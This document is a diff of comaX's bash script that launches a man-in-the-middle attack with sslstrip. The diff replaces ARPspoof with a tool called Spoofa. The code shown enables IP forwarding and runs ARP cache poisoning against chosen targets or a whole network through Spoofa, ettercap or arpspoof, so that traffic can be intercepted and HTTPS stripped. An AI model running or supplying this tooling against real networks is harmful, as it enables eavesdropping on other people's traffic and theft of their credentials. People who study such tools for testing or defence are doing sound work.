@@ -1,19 +1,19 @@
-# #!/bin/bash
+#!/bin/bash
 # Bash script to launch man it the middle attack and sslstrip.
 # version 0.9 by comaX
 version="20130313"
 if [ $UID -ne 0 ]; then
-    echo -e "\033[31This program must be run as root.
+  echo -e "\033[31This program must be run as root.
 This will probably fail.\033[m"
-    sleep 3
-    fi
+  sleep 3
+fi
 
 log_output_dir=~
 sslstrip_dir=/usr/share/sslstrip
 ask_for_install=y
 
 if [ ! -d "$log_output_dir" ]; then
-    mkdir -p $log_output_dir
+  mkdir -p $log_output_dir
 fi
 
 # if user ^C then execute cleanup function
@@ -34,13 +34,13 @@ if [[ $dnsid != "" ]];then
 fi
 
 if [[ $etterspoofid != "" ]];then
-kill $etterspoofid
+	kill $etterspoofid
 fi
 
 if [[ "$etter" = "1" ]];then
 	killall ettercap
 else
-	killall arpspoof
+	echo -e "\033[31m\nTo quit Spoofa and re-ARP network, ctrl-C in Spoofa window\033[m\n"
 fi
 
 echo "0" > /proc/sys/net/ipv4/ip_forward #stop ipforwarding
@@ -101,7 +101,7 @@ case $1 in
 	sleep 3
 	done ;;
 
-	-e | --etter) echo -e "\tYou will be using Ettercap instead of ARPspoof."
+	-e | --etter) echo -e "\tYou will be using Ettercap instead of Spoofa."
 	etter="1"
 	shift
 	sleep 0.5 ;;
@@ -113,8 +113,8 @@ case $1 in
 usage : $0 -h -c -p -e -s -f
 	-h or --help  :	Display this help message, disclaimer and exit.
 	-c or --change: Display changelog and todo.	
-	-e :	Use ettercap instead of ARPspoof. One might have one's reasons...
-			ARPspoof is default.
+	-e :	Use ettercap instead of Spoofa. One might have one's reasons...
+			Spoofa is default.
 	-p or --parse :	Only parse the given <file>. Don't use wildcards.
 			Use > /output_file to print to a file.
 	-s : Stealth mode. The script won't download anything.
@@ -320,7 +320,7 @@ fi
 if [[ "$etter" = "1" ]];then
 	killall ettercap
 else
-	killall arpspoof
+	 echo -e "\033[31m\nTo quit Spoofa and re-ARP network, ctrl-C in Spoofa window\033[m\n"
 fi
 
 echo "0" > /proc/sys/net/ipv4/ip_forward #stop ipforwarding
@@ -615,7 +615,7 @@ echo
 
 #Arpspoofing
 echo
-echo -e "\033[31m [+] Activating ARP cache poisoning... \033[m"
+echo -e "\033[31m [+] Activating ARP poisoning with Spoofa... \033[m"
 echo
 ip route show | awk '(NR == 1) { print "Gateway :", $3,"    ", "Interface :", $5}' #Output IP route show user-friendly
 iface=$(ip route show | awk '(NR == 1) { print $5}')
@@ -651,17 +651,13 @@ if [[ $choicearp = "D" || $choicearp = "d" ]];then
 	else
 		echo -e "\033[m "
 	fi
-	echo -e "Please enter targets according to usage : IP1 IP2 IP3...
+	
+	if [[ "$etter" = "1" ]];then
+		echo -e "Please enter targets according to usage : IP1 IP2 IP3...
 \033[31m Beware ! This will spawn as many windows as input targets and might slow down performances. If that was the case, then use whole network targeting.\033[m "
-	arpspoofi()
-	{ # We launch ARPspoof in different xterm windows to keep script running
-	while [ "$1" != "" ];do
-		xterm -geometry 90x3-1-1 -T "Poisoning $1" -e arpspoof -i $iface -t $1 $gateway 2>/dev/null & sleep 2
-		shift 
-	done
-
-	echo -e "\033[33m Targeting $parameters on $gateway on $iface with ARPspoof\033[m"
-	}
+	else 
+		echo -e "Enter target IP(s), separated by comma, and/or as a range.\nE.g. 10.1.1.2,10.1.1.15-20"
+	fi
 
 	ettercapi()
 	{ # We launch ARPspoof in different xterm windows to keep script running
@@ -677,7 +673,8 @@ if [[ $choicearp = "D" || $choicearp = "d" ]];then
 	if [[ "$etter" = "1" ]];then
 		ettercapi $parameters
 	else
-		arpspoofi $parameters
+		xterm -geometry 90x5-1-1 -T "Spoofa" -e spoofa -vp -t $parameters -g $gateway -i $iface 2>/dev/null & sleep 2
+		echo -e "\033[33m Targeting $parameters on $gateway on $iface with Spoofa\033[m"
 	fi
 
 else 
@@ -686,9 +683,9 @@ else
 		sleep 2
 		echo -e "\033[33m Targeting the whole network on $gateway on $iface with Ettercap\033[m"
 	else
-		xterm -geometry 90x3-1-1 -T arpspoof -e arpspoof -i $iface $gateway &
+		xterm -geometry 90x5-1-1 -T Spoofa -e spoofa -vp  -i $iface -g $gateway &
 		sleep 2
-		echo -e "\033[33m Targeting the whole network on $gateway on $iface with ARPspoof\033[m"
+		echo -e "\033[33m Spoofing all live targets on $gateway on $iface with Spoofa\033[m"
 	fi
 fi
 
